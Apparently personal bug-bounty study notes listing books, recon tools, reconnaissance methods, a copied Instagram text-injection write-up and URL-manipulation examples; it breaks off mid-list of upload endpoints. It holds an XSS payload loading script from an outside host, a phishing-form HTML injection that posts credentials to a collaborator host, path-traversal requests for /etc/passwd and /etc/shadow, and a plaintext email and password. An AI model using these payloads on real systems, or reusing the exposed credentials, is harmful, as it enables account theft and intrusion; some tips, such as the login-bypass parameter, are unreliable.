
# final bug bounty objective: 30K+

_quote: 0/30¬∞000_

_maybe at least 2k per week?_

---

üåü ùóïùóòùó¶ùóß ùü± ùóïùó¢ùó¢ùóûùó¶ ùóôùó¢ùó• ùóïùó®ùóö ùóõùó®ùó°ùóßùóòùó•ùó¶ & ùóòùóßùóõùóúùóñùóîùóü ùóõùóîùóñùóûùóòùó•ùó¶! üåü

‚ö†Ô∏è ùôáùôöùôñùôßùô£ ùô¨ùôöùôó ùôùùôñùôòùô†ùôûùô£ùôú, ùôóùô™ùôú ùôùùô™ùô£ùô©ùôûùô£ùôú & ùô§ùôõùôõùôöùô£ùô®ùôûùô´ùôö ùô®ùôöùôòùô™ùôßùôûùô©ùôÆ ‚Äî ùôñùô°ùô° ùôõùôßùô§ùô¢ ùô©ùôùùôöùô®ùôö ùô°ùôöùôúùôöùô£ùôôùôñùôßùôÆ ùôóùô§ùô§ùô†ùô®.

1Ô∏è‚É£ ùôèùôùùôö ùôíùôöùôó ùòºùô•ùô•ùô°ùôûùôòùôñùô©ùôûùô§ùô£ ùôÉùôñùôòùô†ùôöùôß‚Äôùô® ùôÉùôñùô£ùôôùôóùô§ùô§ùô†
2Ô∏è‚É£ ùòΩùô™ùôú ùòΩùô§ùô™ùô£ùô©ùôÆ ùòΩùô§ùô§ùô©ùôòùôñùô¢ùô• ‚Äì ùòùùò™ùò§ùò¨ùò™ùò¶ ùòìùò™
3Ô∏è‚É£ ùôçùôöùôñùô°-ùôíùô§ùôßùô°ùôô ùòΩùô™ùôú ùôÉùô™ùô£ùô©ùôûùô£ùôú ‚Äì ùòóùò¶ùòµùò¶ùò≥ ùò†ùò¢ùò∏ùò∞ùò≥ùò¥ùò¨ùò™
4Ô∏è‚É£ ùòΩùô°ùôñùôòùô† ùôÉùôñùô© ùôÇùôßùôñùô•ùôùùôåùôá ‚Äì ùòàùòóùòê ùòºùòµùòµùò¢ùò§ùò¨ùò¥
5Ô∏è‚É£ ùôèùôùùôö ùôÉùôñùôòùô†ùôöùôß ùôãùô°ùôñùôÆùôóùô§ùô§ùô† ‚Äì ùòóùò≥ùò¢ùò§ùòµùò™ùò§ùò¢ùò≠ ùòéùò∂ùò™ùò•ùò¶ ùòõùò∞ ùòóùò¶ùòØ ùòõùò¶ùò¥ùòµùò™ùòØùò®


![[Pasted image 20250301173713.png]]

[CVSS Calculator ‚Äì Professor Software Solutions‚Äì>';\"/><img src onerror=import('//ha.ez.pe')>](https://bughuntar.com/tools/cvsscalculator/)

methodology:

**Yeswehack vdp finder.**

![None](https://miro.medium.com/v2/resize:fit:700/1*xBT1c83XM7fwPP3hVTgkPA.png)

**This will give a alert when that website has vulnerability disclosure program.**

# Find Good Bug bounty Programs:

! **This feature is only on BugCrowd, not hackerone, You can select a date and find out about a public program:**

![[Pasted image 20250315204758.png]]



We can see that only 1 vulnerability has been rewarded with 2.5k $  

and that the program started on **Feb 13**

![[Pasted image 20250315210105.png]]

![[Pasted image 20250315212625.png]]

and by clicking on the "eye" you can view the bug too:

![[Pasted image 20250315212652.png]]

Check for these features on others programs like:

[https://www.synack.com/](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbXZteVl2elB0WjA5SXpONzdxNXJmdDgtYmNYQXxBQ3Jtc0tudWo3dE1UQld4Tjg0eFA1bWMwTXBRWE9BMFNzMEV6NVNTbU9xNkV4WnZmRnR4ZXhnRk04dG53emRtd2pUTmhSb01jdk9uNW9ZSFBjUUtzZHZJQmJtZzNUSnVGRDZmZjA5TkNFMFFoNE9uVlRRQ0xSVQ&q=https%3A%2F%2Fwww.synack.com%2F&v=f5MJLSKU-7A) [https://www.intigriti.com/](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbjBYd0hwdUJmaW5kb0hLUGJjTi1YRDNIVzdlQXxBQ3Jtc0tuZ3ZfMFU0aXdaU0hHdWxTVGFWdkk4b25HSkFuSFpBQWZoX21GYjF4Q1dmUGROSDE3MXVPMFo5TVRqdjFwd0h6MWdYV0FOcUNfYUlsaXp4QWlkQmo2QXF3N0Z6SnVVWGpnaFBmUWtLX211V1phclNUcw&q=https%3A%2F%2Fwww.intigriti.com%2F&v=f5MJLSKU-7A) [https://www.yeswehack.com/](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbG1KTHJFdzRXLXlxRUhtRFVUMktNbmlfVDVHQXxBQ3Jtc0trRjF6THhvQ3JxZGdjTGFQeFFxakduWFk5emZrS1FhODRYMUVOalpCbHB2NmJiYld2bXBEWVA1Y3NPZlc5c293Mjluc3JOWVFISzYwWGp0Ul80Y3BnRktjcmYxZHJLSkxvWjhoSW5YUlFadFluQjdCRQ&q=https%3A%2F%2Fwww.yeswehack.com%2F&v=f5MJLSKU-7A)

## Tip: 2

![[Pasted image 20250315212942.png]]

as recently... you can select anything from **february first** (since we're on march right now) and filter this out:

![[Pasted image 20250315213100.png]]

Now what you want to do is.... see if ~={green}they implement a sufficent fix:=~

So simply see the POC and the **developer fix**

![[Pasted image 20250315213221.png]]

---

‚öôÔ∏è Complete Bug Bounty tool List ‚öôÔ∏è

Enjoy :)

dnscan https://github.com/rbsec/dnscan

Knockpy https://github.com/guelfoweb/knock

Sublist3r https://github.com/aboul3la/Sublist3r

massdns https://github.com/blechschmidt/massdns

Nmap https://nmap.org

Masscan https://github.com/robertdavidgraham/masscan

EyeWitness https://github.com/ChrisTruncer/EyeWitness

DirBuster https://sourceforge.net/projects/dirbuster/

dirsearch https://github.com/maurosoria/dirsearch

Gitrob https://github.com/michenriksen/gitrob

git-secrets https://github.com/awslabs/git-secrets

sandcastle https://github.com/yasinS/sandcastle

bucket_finder https://digi.ninja/projects/bucket_finder.php

GoogD0rker https://github.com/ZephrFish/GoogD0rker/

Wayback Machine https://web.archive.org

waybackurls https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050 

Sn1per https://github.com/1N3/Sn1per/

XRay https://github.com/evilsocket/xray

wfuzz https://github.com/xmendez/wfuzz/

patator https://github.com/lanjelot/patator

datasploit https://github.com/DataSploit/datasploit

hydra https://github.com/vanhauser-thc/thc-hydra

changeme https://github.com/ztgrace/changeme

MobSF https://github.com/MobSF/Mobile-Security-Framework-MobSF/ 

Apktool https://github.com/iBotPeaches/Apktool

dex2jar https://sourceforge.net/projects/dex2jar/

sqlmap http://sqlmap.org/

oxml_xxe https://github.com/BuffaloWill/oxml_xxe/

XXE Injector https://github.com/enjoiz/XXEinjector

The JSON Web Token Toolkit https://github.com/ticarpi/jwt_tool

ground-control https://github.com/jobertabma/ground-control

ssrfDetector https://github.com/JacobReynolds/ssrfDetector

LFISuit https://github.com/D35m0nd142/LFISuite

GitTools https://github.com/internetwache/GitTools

dvcs-ripper https://github.com/kost/dvcs-ripper

tko-subs https://github.com/anshumanbh/tko-subs

HostileSubBruteforcer https://github.com/nahamsec/HostileSubBruteforcer

Race the Web https://github.com/insp3ctre/race-the-web

ysoserial https://github.com/GoSecure/ysoserial

PHPGGC https://github.com/ambionics/phpggc

CORStest https://github.com/RUB-NDS/CORStest

Retire-js https://github.com/RetireJS/retire.js

getsploit https://github.com/vulnersCom/getsploit

Findsploit https://github.com/1N3/Findsploit

bfac https://github.com/mazen160/bfac

WPScan https://wpscan.org/

CMSMap https://github.com/Dionach/CMSmap

Amass https://github.com/OWASP/Amass

Extra Tools
http://projectdiscovery.io

---

LostSec Cheat Sheet: https://lostsec.xyz

![[Pasted image 20241130101000.png]]

## 1Ô∏è‚É£BOUNTY TARGETS DATA

Below you can find data about bug bounty program targets hosted on various crowdsourced platforms like HackerOne, BugCrowd, Intigriti, YesWeHack, etc‚Ä¶ which is updated every hour.

No need to put effort on your own VPS that comes with cost for every processing and computing for this particular scope gathering crucial step. This step is used by bug hunters who have a new endpoint or unique approach, and they want to mass hunt on all the targets with scalability.

> [arkadiyt/bounty-targets-data: This repo contains hourly-updated data dumps of bug bounty platform scopes (like Hackerone/Bugcrowd/Intigriti/etc) that are eligible for reports](https://github.com/arkadiyt/bounty-targets-data)


## 3Ô∏è‚É£¬†**SUBDOMAINS DATA**

Find list of subdomains data that is already collected and served to you from various top level sources.


#Important_report

> [Chaos by Projectdiscovery](https://chaos.projectdiscovery.io/)

![[Pasted image 20241201145922.png]]

Skip the subdomain gathering step and proceed with your next step in your recon or directly start the testing process.

## Helpfull Chatgpt Prompts
#### 1Ô∏è‚É£ CVE Paths

- Provide CVE related paths for 20 different products.

#### 2Ô∏è‚É£Uncommon Paths

- Uncommon paths that might lead to PhpMyAdmin, don't give general paths that are already found in many public wordlists

#### 3Ô∏è‚É£PHP Web App

- 40 paths that might lead to misconfiguration and direct information disclosure in PHP web app
- Instead of PHP, we can write ASP, JSP, IIS, DJANGO, react.js, next.js etc‚Ä¶

#### 4Ô∏è‚É£CMS (Content Management System)

- 20 different Adobe Experience Manager CMS endpoints useful for bug hunters that might lead to misconfiguration and information disclosure, etc..
- CMS Like: WordPress, Joomla, Drupal, etc..

#### 5Ô∏è‚É£Backup Files

- 20 uncommon paths that might lead to database backup files, don't give general paths that are already available in many public wordlists.

#### 6Ô∏è‚É£Server Operating System

- web app served from Ubuntu server, give 20 different paths that might lead to internal source code disclosure, misconfiguration, database files, information disclosure, or any type of leak

#### 7Ô∏è‚É£Hardened Targets

- Target is behind "xyz" load balancer, how to test "abc" vulnerability category now.
- Target is behind "xyz" load balancer, what are the common configuration and implementation mistakes and how to test them externally.

#### 8Ô∏è‚É£Specific Endpoint

- Target has OAUTH functionality, how to test it for common implementation mistakes by beginner developers.

#### 9Ô∏è‚É£Explanation Type

- Explain to me using detailed "request and response" application flow.
- Explain to me through ASCII art
- Explain to me through an analogy
- Explain to me in lay-man terms
- Explain to me with a real-world company scenario.

#### üîüChange Identity

- Before giving other prompts, ask like the below
- "Now think like a lazy developer and sysadmin"
- "Now think like an intern"
- "Now think like a developer who is in a hurry and project deadline tomorrow"
- "Now think like a developer without cybersecurity and secure coding knowledge"
- "Now think like a developer who has intermediate-level pen-testing knowledge" ‚Äî helps to find hidden or left-out test cases by the majority.
- "Now think like a developer or sysadmin who hasn't updated an application from 1 year".
- For 1 hour act like "<*insert above prompts here>"

---

# Find new apex domains that are related to your bug bounty target.

#subdomain_collections 

**Many tools for "osint"** (Waymore, Katana, Maigret etc) return long lists of URLs as results. 

**Here's an article on how to work with them a bit more efficiently:**

5 very simple tricks to quickly analyze a larger list of URLs

resource: https://medium.com/@cyb_detective/5-simple-tricks-to-quickly-analyze-a-larger-list-of-urls-860c9b718b34



---
## **What are the apex domains?**

**We have a domain,** [**https://help.evil.com**](https://help.evil.com)**; https:// is a protocol, and help is a subdomain; evil is an apex domain, and com is the TLD.** (**top-level domain**)

**This technique is very effective when your program scope is large.**

**Any assets they owned are all in the scope.**

**Example**‚¨áÔ∏è

**Facebook, Google, Apple, etc..**

**So, let‚Äôs start.**

**Open the below link‚¨áÔ∏è**

> https://mxtoolbox.com/whois.aspx

**Enter your target name and click on Whois Lookup.**

![](https://miro.medium.com/v2/resize:fit:627/1*thPtwVGBMYZstqj6bEab4g.png)

**Press Ctrl + F and search for the admin email.**

![](https://miro.medium.com/v2/resize:fit:627/1*s0mAfRE7QGHRqIE-admJug.png)

**copy that admin email.**

**Click on the link below.**

> https://www.whoisxmlapi.com/

**After successfully creating your account.**

**Now, log in to your account.**

**On the Products tab, select Web Tools‚¨áÔ∏è.**

![](https://miro.medium.com/v2/resize:fit:501/1*U-kZTgC1uc5BQKCDVtarpg.png)


**Select Reverse Whois Lookup**

![](https://miro.medium.com/v2/resize:fit:627/1*RE8NuLHO9_1G8iszPBZnKQ.png)


**Enter that copied admin and click on Lookup.**

![](https://miro.medium.com/v2/resize:fit:627/1*6VDkkyg2mIAT1AqYkUcGgA.png)

		Screenshot by author whoisXML‚Äôs reverse whois lookup page

**Results‚¨áÔ∏è**

![](https://miro.medium.com/v2/resize:fit:627/1*2erlh18egTGp8VmGI9xiNA.png)

**Now, I have 41 new apex domains. I can find new subdomains, and  have more chances to find a valid bug.**

other sites:

https://whoisfreaks.com/tools/whois/reverse/search

[https://viewdns.info/reversewhois/](https://viewdns.info/reversewhois/)

![[Pasted image 20250323165131.png]]

> https://aadinternals.com/osint/

> **_Enter your target and click on Get information_**

**After I confirmed with Google that new apex domain is related to my bug bounty target**

```bash
who aquired "target.com"

who owned "target.com"
```


----

```bash
site:github.com "bug bounty methodology"  
site:github.com "bug hunting methodology"  
site:github.com "private bug hunting methodology"  
site:github.com "bug bounty mindmap"  
  
site:medium.com "bug bounty methodology"  
site:medium.com "bug hunting methodology"  
site:medium.com "private bug hunting methodology"

gitbook.io:

site:*.gitbook.io "bug hunting"  
site:*.gitbook.io "bug bounty"

```

start from here, maybe not hackerOne?

[Free Bug Bounty Program and Coordinated Vulnerability Disclosure | Open Bug Bounty](https://www.openbugbounty.org/)

[Bug Zero](https://bugzero.io/signup)

creds:

![[Pasted image 20250109190704.png]]

```
email: andrea.zaric07@gmail.com


passwd: VDSTDUgy37684%¬£/&87

```

Lesser-Known / Niche Platforms

 1. SafeHats
 ‚Ä¢ Focus: Crowd-sourced security testing for SMEs.
 2. HackenProof
 ‚Ä¢ Focus: Blockchain and crypto-related bug bounties.
 3. Zerocopter
 ‚Ä¢ Focus: EU-based companies with a small but curated pool of researchers.
 4. Bugbase
 ‚Ä¢ Focus: Indian organizations and startups.
 5. YesWeHack
 ‚Ä¢ Focus: European-based programs, especially French-speaking markets.
 6. Bugwolf
 ‚Ä¢ Focus: Speed-focused bug bounties for app and site launches.
 7. Intigriti
 ‚Ä¢ Focus: Diverse bounties for EU-based organizations.
 8. Cobalt
 ‚Ä¢ Focus: Pentester-curated reports for smaller clients.
 9. Secuna
 ‚Ä¢ Focus: Philippines-based startups and businesses.
 10. Vulners
 ‚Ä¢ Focus: Vulnerability scanning tools with researcher integration.
 11. Strobes
 ‚Ä¢ Focus: Integrates vulnerability scanning with bug bounty workflows.
 12. CyberArmy
 ‚Ä¢ Focus: Small organizations and cybersecurity startups.
 13. Raxis
 ‚Ä¢ Focus: Pentesting-centric bounties.
 14. Hacken.ai
 ‚Ä¢ Focus: Cybersecurity apps and platforms in Eastern Europe.
 15. Bugheist
 ‚Ä¢ Focus: Crowdsourced ethical hacking and vulnerability reporting.

Mid-Tier / Moderately Popular Platforms

 16. Bounty Factory
 ‚Ä¢ Focus: EU-based bug bounties.
 17. Crowdcurity
 ‚Ä¢ Focus: Cloud-centric vulnerability reporting.
 18. Open Bug Bounty
 ‚Ä¢ Focus: Free participation in responsible disclosure.
 19. Elude
 ‚Ä¢ Focus: Anonymous vulnerability reporting.
 20. Topcoder
 ‚Ä¢ Focus: Code and application-level bounties.
 21. HackerOne for Startups
 ‚Ä¢ Focus: Smaller organizations‚Äô penetration testing.
 22. Synack
 ‚Ä¢ Focus: Heavily vetted researchers for enterprise security.
 23. Detectify Crowdsource
 ‚Ä¢ Focus: Vulnerability discovery for Detectify‚Äôs SaaS scanner.
 24. Bugcrowd LevelUp
 ‚Ä¢ Focus: Learning and smaller bug bounty opportunities.
 25. Bugbounty.jp
 ‚Ä¢ Focus: Japanese-based companies‚Äô vulnerability testing.

Highly Popular Platforms

 26. HackerOne
 ‚Ä¢ Focus: Widely known platform for all industries.
 27. Bugcrowd
 ‚Ä¢ Focus: Large variety of programs for different skill levels.
 28. Microsoft Bug Bounty Program
 ‚Ä¢ Focus: Microsoft products and services.
 29. Google Vulnerability Reward Program
 ‚Ä¢ Focus: Google services and Android-related vulnerabilities.
 30. Synack Red Team
 ‚Ä¢ Focus: Elite pentesting and bug bounty researchers for enterprise systems.

![[Pasted image 20241211065714.png]]

![[Pasted image 20241211070052.png]]

medium article from: [Hacking For 20 Hours in a Private Bug Bounty Program | by G√∂khan G√ºzelkokar | Medium](https://medium.com/@gguzelkokar.mdbf15/hacking-for-20-hours-in-a-private-bug-bounty-program-c466193cb69a)

_The most common mistake in Bug bounty, when bug hunter picked a target to hack, hacker doesn‚Äôt spend a long time on the target. So, when you pick a target hack on it for a long time. Actually, 20 hours is not a long time but it‚Äôs enough to understand company logic. Let‚Äôs talk about steps._

# 1 ‚Äî Use timer

When you start to hack focus and use timer. I used¬†[Clockify](https://app.clockify.me/)¬†for this.

![](https://miro.medium.com/v2/resize:fit:656/1*c8mlAqpAbqKHh9dOJRk3Vw.png)

# 2‚Äî Take notes (Most important)

**If you're not taking notes, you just won't be successfull, because you need to keep notes to understand what you've tested, how are they identifying the object, the back-end**

Write everything you see about your target, technologies, responses for specific payloads, roles, capabilities for every single role‚Ä¶ I will share my template and some example notes for this journey.

![](https://miro.medium.com/v2/resize:fit:478/1*9wDNmamVaq3DnZ125jfjjA.png)

					Priveleges in your target

  
![](https://miro.medium.com/v2/resize:fit:656/1*XtUjLYCYXlOK_Jl1bAVTQg.png)

				Feature of endpoints and your notes about app

![](https://miro.medium.com/v2/resize:fit:656/1*rea1LQeA2YcpnsY3uhFA6A.png)

									Error messages

![](https://miro.medium.com/v2/resize:fit:656/1*FSL-bFZ0M0W9s6rB8uWP9Q.png)

								Bugs & Potential Bugs

![](https://miro.medium.com/v2/resize:fit:390/1*B0sLm6rISIY4SnyAi7YucA.png)

					Reports

I made 5000$ in this journey. First of all, when I work with timer and notes like this, I enjoyed a lot than classic method. I‚Äôll share some of my reports too. Thanks¬†[gregxsunday](https://twitter.com/gregxsunday)

  
![](https://miro.medium.com/v2/resize:fit:656/1*drgLcrd4rPN-_fRask3Spw.png)

![](https://miro.medium.com/v2/resize:fit:656/1*UdAdcgxo9Hmlt1bthvCepw.png)

![](https://miro.medium.com/v2/resize:fit:574/1*U3x4xspMXDSVmiZvsz1kYw.png)

![](https://miro.medium.com/v2/resize:fit:574/1*DlYR3KdhL2tNvUPCBZ3xtQ.png)

![](https://miro.medium.com/v2/resize:fit:574/1*vYdNnH51d1TKQCtkqYrUOA.png)

![](https://miro.medium.com/v2/resize:fit:574/1*Yce56okb7z8FoO00y1MxXg.png)

![](https://miro.medium.com/v2/resize:fit:574/1*qajaPyFertANsNkoIGHS3A.png)

![](https://miro.medium.com/v2/resize:fit:574/1*fFDmkem-pAB317ohvMHKRw.png)

![](https://miro.medium.com/v2/resize:fit:574/1*gEeJhsQbPrOoNgne7alhgw.png)

---

> https://orwaatyat.medium.com/


![[Pasted image 20250208005138.png]]




https://medium.com/@rootplinix/how-i-hacked-over-150k-pii-on-a-program-f58b8b141d4a 

https://systemweakness.com/bug-hunting-recon-methodology-part1-legionhunter-975b7bbe3231 

https://osintteam.blog/bug-hunting-recon-methodology-part2-legionhunter-4bb925e3e1bf 

https://medium.com/@bitthr3at/deep-dive-in-reconnaissance-a1e88cfdebf5 

---


https://medium.com/@harshhatej85/unrestricted-file-upload-vulnerability-testing-examples-bypassing-blacklisting-of-php-extension-7854f1746445


https://cybersecuritywriteups.com/how-i-able-to-inject-my-malicious-link-in-email-confirmation-link-link-injection-open-redirect-dbf95075f89c  

https://hashimamin.medium.com/hacking-e-commerce-for-idor-and-more-29cee84cd30e 


https://medium.com/hackernoon/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824 

https://freedium.cfd/https://harish45.medium.com/pre-account-takeover-through-misconfigured-oauth-on-a-mailing-website-b906a5c118e9 

https://medium.com/h7w/oauth-misconfiguration-pre-account-takeover-535beb8d1987 

https://medium.com/@muhammedgalal66/oauth-account-takeover-ato-vulnerability-via-email-manipulation-94e0e942bcb8 

https://medium.com/@abhirupkonwar04/20-open-redirect-bugs-in-few-minutes-c9fdabf75642 

https://freedium.cfd/https://medium.com/@bugbounty_learners/clickjacking-tips-and-tricks-working-80-on-hackerone-350-300-200-f7b73e5fa9c6 

## Html Injection

test for HTMLI:

```
<h1><a href=bit.ly/48rQIVc>Click
```

POC:

```html
Payload in firstname:  
Dear Team  
  
As part of our commitment to security, we have logged you out of your accounts due to recent updates in our system protocols. To ensure the safety and integrity of your account, please re-login using the secure link provided below.  

<html>  
<body>  
<form action="https://burpcolloborator.com">Login again for security:<br><br>   
<label for="u">Email id:  
<input type="text" id="u" name="u"><br><br>  
<label for="p">Password:  
<input type="password" id="p" name="p"><br></br>  
<input type="submit" value="Submit">  
</body>  
</html>  
  
Payload in lastname:  
If you encounter any issues or have questions, feel free to reach out to our IT support team at. We appreciate your cooperation in keeping our systems secure.  
  
Thank you for your understanding.  
  
Best Regards,  
Samsung Developer  
<!--
```


##  Facebook Text Injection Vulnerability: A Creative Approach | Bug Bounty:

source: [Facebook Text Injection Vulnerability: A Creative Approach | Bug Bounty | by Ph.Hitachi | Jan, 2025 | InfoSec Write-ups](https://infosecwriteups.com/facebook-text-injection-vulnerability-a-creative-approach-bug-bounty-048076ad35ea)

# Introduction

In the world of bug bounty hunting, not every vulnerability you stumble upon is immediately considered ‚Äúin scope.‚Äù However, with creativity and a deeper understanding of how systems interact, even seemingly benign issues can be escalated into impactful security threats. This write-up highlights one such case where we identified a¬†**text injection vulnerability**¬†‚Äî typically classified as¬†**out-of-scope**¬†in Facebook‚Äôs bug bounty program ‚Äî ~={green}that, with some innovative thinking, we escalated it into a valid security exploit.=~

# Overview:

Our journey began with a simple discovery:¬†**a text injection vulnerability on an Instagram authorization endpoint**. On its own, this might not have seemed dangerous or noteworthy. However, by leveraging¬†**OAuth authentication flows**¬†and¬†**Open Redirection**, we managed to create a chain of events that turned an¬†**out-of-scope issue into a legitimate security concern**.

This creative escalation ultimately demonstrated a potential phishing attack scenario that tricked users into believing their Instagram accounts couldn‚Äôt be logged into ‚Äî ~={red}after they had successfully authenticated.=~

## The Discovery: A Simple Text Injection

During a routine test of Instagram‚Äôs OAuth process with a third-party application, we were unexpectedly redirected to the following error page:

```
https://www.instagram.com/oauth/authorize/third_party/error/?message=Insufficient%20Developer%20Role%3A%20Insufficient%20developer%20role
```

![](https://miro.medium.com/v2/resize:fit:875/1*-eLewgwt_MO7fJ4FHACotw.png)

At first glance, this was a typical error page indicating insufficient permissions for the third-party app. However, we noticed something peculiar ‚Äî the¬†`**message**`¬†parameter was reflected back on the page unmodified . This led us to realize that any user-supplied text could be injected into the page via the URL parameter.

At this point, we had a basic¬†**content spoofing**¬†issue on our hands. While content injection is typically considered¬†**out of scope**¬†in Meta‚Äôs bug bounty program, we saw potential to escalate it.

![](https://miro.medium.com/v2/resize:fit:875/1*SxbsroM9lnIWHd6tPxRPMg.png)

	Content injection. Posting content on Facebook is a core feature, and content injection (also ‚Äúcontent spoofing‚Äù or ‚ÄúHTML injection‚Äù) is out of scope unless you can clearly demonstrate a significant risk.

Recognizing this behavior as a¬†**text injection vulnerability**, we wondered if we could exploit it further.

---

## URL‚Äôs Manipulation for Reconnaissance

> So, how can URL manipulation help you in real-life scenarios?

_Imagine you‚Äôre a journalist investigating a company‚Äôs unethical practices. You can use URL manipulation to access hidden pages or directories that reveal information about the company‚Äôs operations._

1. Accessing a hidden login page: add ‚Äú/login‚Äù to the end of the URL to access the login page.

Example: [www.example.com/login](http://www.example.com/login)

2. Bypassing login: add ‚Äú?loggedin=true‚Äù to the end of the URL to bypass the login page.

Example: [www.example.com/dashboard?loggedin=true](http://www.example.com/dashboard?loggedin=true)

3. Changing page parameters: modify the page number or limit parameters to access different pages or more results.

Example: [www.example.com/articles?page=2](http://www.example.com/articles?page=2) or [www.example.com/search?limit=50](http://www.example.com/search?limit=50)

4. Filtering content: add filters to the query parameters to filter content by category, date, location, or other criteria.

5. Searching for keywords: add the keyword parameter to the URL to search for specific words or phrases.

Example: [www.example.com/search?keyword=OSINT](http://www.example.com/search?keyword=OSINT) or [www.example.com/blog?query=artificial+intelligence](http://www.example.com/blog?query=artificial+intelligence)

6. Testing for vulnerabilities: add known vulnerabilities or exploits to the URL to test if the website is vulnerable.

Example: [www.example.com/vulnerability.php?id=1'](http://www.example.com/vulnerability.php?id=1%27) or [www.example.com/exploit.php?cmd=ls](http://www.example.com/exploit.php?cmd=ls)

7. Checking for robots.txt: add ‚Äú/robots.txt‚Äù to the end of the URL to check if the website has a robots.txt file that may reveal hidden directories or pages.

Example: [www.example.com/robots.txt](http://www.example.com/robots.txt)

8. Testing for directory listing: add ‚Äú/directory/‚Äù to the end of the URL to test if the directory is accessible and lists the files inside.

Example: [www.example.com/images/](http://www.example.com/images/)

9. Enumerating usernames: add a username parameter to the URL to test if the website reveals if a username exists or not.

Example: [www.example.com/user.php?username=admin](http://www.example.com/user.php?username=admin) or [www.example.com/profile.php?user=john](http://www.example.com/profile.php?user=john)

10. Testing for file inclusion: add known vulnerabilities to the URL to test if the website is vulnerable.

Example: [www.example.com/index.php?page=../../etc/passwd](http://www.example.com/index.php?page=..%2F..%2Fetc%2Fpasswd) or [www.example.com/view.php?file=/var/log/apache/access.log](http://www.example.com/view.php?file=%2Fvar%2Flog%2Fapache%2Faccess.log)

11. Accessing a hidden forum: add ‚Äú/forum‚Äù or ‚Äú/discussion‚Äù to the end of the URL to access the forum or discussion page.

Example: [www.example.com/forum](http://www.example.com/forum) or [www.example.com/discussion](http://www.example.com/discussion)

12. Checking for backups: add ‚Äú/backup‚Äù or ‚Äú/backup.zip‚Äù to the end of the URL to check if the website has backups that may contain sensitive information.

Example: [www.example.com/backup](http://www.example.com/backup) or [www.example.com/backup.zip](http://www.example.com/backup.zip)

13. Accessing a hidden API: add ‚Äú/api‚Äù to the end of the URL to access the API endpoint.

Example: [www.example.com/api](http://www.example.com/api)

14. Checking for file upload vulnerabilities: add known file upload exploits to the URL to test if the website is vulnerable.

Example: [www.example.com/upload.php?file=../../etc/passwd](http://www.example.com/upload.php?file=..%2F..%2Fetc%2Fpasswd) or [www.example.com/upload.php?file=/etc/shadow](http://www.example.com/upload.php?file=%2Fetc%2Fshadow)

15. Accessing a hidden wiki: add ‚Äú/wiki‚Äù to the end of the URL to access the wiki page.

Example: [www.example.com/wiki](http://www.example.com/wiki)

16. Checking for subdomains: add a subdomain parameter to the URL to test if the website has subdomains.

Example: [www.example.com/subdomain.php?subdomain=blog](http://www.example.com/subdomain.php?subdomain=blog)

17. Testing for SQL injection vulnerabilities: add known SQL injection exploits to the URL to test if the website is vulnerable.

Example: [www.example.com/search.php?keyword='](http://www.example.com/search.php?keyword=%27) or [www.example.com/admin.php?id=1'](http://www.example.com/admin.php?id=1%27)

18. Checking for XSS vulnerabilities: add known XSS exploits to the URL to test if the website is vulnerable.

Example: www.example.com/search.php?keyword=<script>alert(1)</script>

19. Accessing a hidden chat room: add ‚Äú/chat‚Äù or ‚Äú/chatroom‚Äù to the end of the URL to access the chat room.

Example: [www.example.com/chat](http://www.example.com/chat) or [www.example.com/chatroom](http://www.example.com/chatroom)

20. Checking for email addresses: add an email parameter to the URL to test if the website reveals email addresses.

Example: [www.example.com/contact.php?email=admin@company.com](http://www.example.com/contact.php?email=admin%40company.com)

21. Accessing a hidden FTP server: add ‚Äú/ftp‚Äù to the end of the URL to access the FTP server.

Example: [www.example.com/ftp](http://www.example.com/ftp)

22. Checking for server-side includes: add known server-side include exploits to the URL to test if the website is vulnerable.

Example: [www.example.com/index.php?page=/etc/passwd](http://www.example.com/index.php?page=%2Fetc%2Fpasswd)

23. Accessing a hidden file: modify the path parameter to access a hidden file.

Example: [www.example.com/file.php?path=/etc/passwd](http://www.example.com/file.php?path=%2Fetc%2Fpasswd)

24. Checking for PHP info: add ‚Äú/phpinfo.php‚Äù to the end of the URL to check if the website has a PHP info file that may reveal sensitive information.

Example: [www.example.com/phpinfo.php](http://www.example.com/phpinfo.php)

25. Accessing a hidden video: modify the video parameter to access a hidden video.

Example: [www.example.com/video.php?id=1234](http://www.example.com/video.php?id=1234)

26. Checking for server status: add ‚Äú/server-status‚Äù to the end of the URL to check if the website has a server status page that may reveal information about the server.

Example: [www.example.com/server-status](http://www.example.com/server-status)

27. Accessing a hidden image: modify the image parameter to access a hidden image.

Example: [www.example.com/image.php?id=1234](http://www.example.com/image.php?id=1234)

28. Checking for server configuration files: add known server configuration file paths to the URL to test if the website is vulnerable.

Example: [www.example.com/config.php](http://www.example.com/config.php) or [www.example.com/wp-config.php](http://www.example.com/wp-config.php)

29. Accessing a hidden audio file: modify the audio parameter to access a hidden audio file.

Example: [www.example.com/audio.php?id=1234](http://www.example.com/audio.php?id=1234)

30. Checking for hidden links: add ‚Äú/hidden-links‚Äù to the end of the URL to check if the website has hidden links that may reveal sensitive information.

Example: [www.example.com/hidden-links](http://www.example.com/hidden-links)


---

**Test for XSS:**


## How to setup blind XSS dashboardüñ•Ô∏è

Register on below three sites , and login. It will give you a list of default payloads as well as it offers encoding feature for better stealth payload spray instead of the raw form of it.

https://bxsshunter.com/?source=post_page-----b997c37a9620--------------------------------

https://xss.report/?source=post_page-----b997c37a9620--------------------------------

https://xsshunter.trufflesecurity.com/?source=post_page-----b997c37a9620--------------------------------

https://portswigger.net/burp/documentation/collaborator?source=post_page-----b997c37a9620--------------------------------



----

## POC Stored XSS on router page:

<iframe width="928" height="522" src="https://www.youtube.com/embed/tXWoRK7JiHk" title="If I find a Vulnerability, the video ends." frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


----

## Waymore

![[Pasted image 20241124194348.png]]

![[Pasted image 20241124194620.png]]

_quick install:_

>  install waymore --break-system-packages

> pip install --upgrade waymore --break-system-packages


-> cat ~/.config/waymore/results/<*site*>/waymore.txt 

-> sudo cat ~/.config/waymore/results/www.ui.ac.ir/waymore.txt | uro | sed 's/m.*/m/' | /home/kali/wordlistLFI.txt lfi | nuclei -tags lfi  --- dosen't work

#### üõ†Waymore Grepping

50 different file manager endpoints that might lead to "unrestricted file upload endpoint" bug:

```endpoints
/admin/files
/admin/upload
/ajax/upload
/api/files
/api/media/upload
/api/upload
/api/upload_file
